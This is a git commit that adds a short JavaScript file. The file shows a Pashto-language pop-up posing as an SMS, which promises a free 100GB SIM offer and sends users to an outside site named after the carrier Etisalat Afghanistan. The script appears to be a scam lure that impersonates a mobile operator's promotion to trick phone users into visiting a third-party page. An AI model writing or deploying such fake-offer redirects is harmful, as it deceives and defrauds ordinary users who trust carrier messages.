d2ed6e37991da646829251a159d66eb4c9d9e795
ekpeowo <ukpehansi@gmail.com>
2025-03-27 00:56:35 +0100

    Create afghan-active.js

---
+++ afghan-active.js
@@ -0,0 +1,5 @@
+var password = '۱۰۰ جي بي فعال کړئ'
+password=prompt('SMS: مبارک شه، ستاسو سیم کارت د 100GB زوړ سیم ځانګړي وړاندیز ترلاسه کولو لپاره وړ دی، اوس د فعالولو لپاره Ok کلیک وکړئ. ','۱۰۰ جي بي فعال کړئ');
+if (password != '۱۰۰ جي بي فعال کړئ') {
+location.href='https://news-active.org/etisalat-afghan';
+}
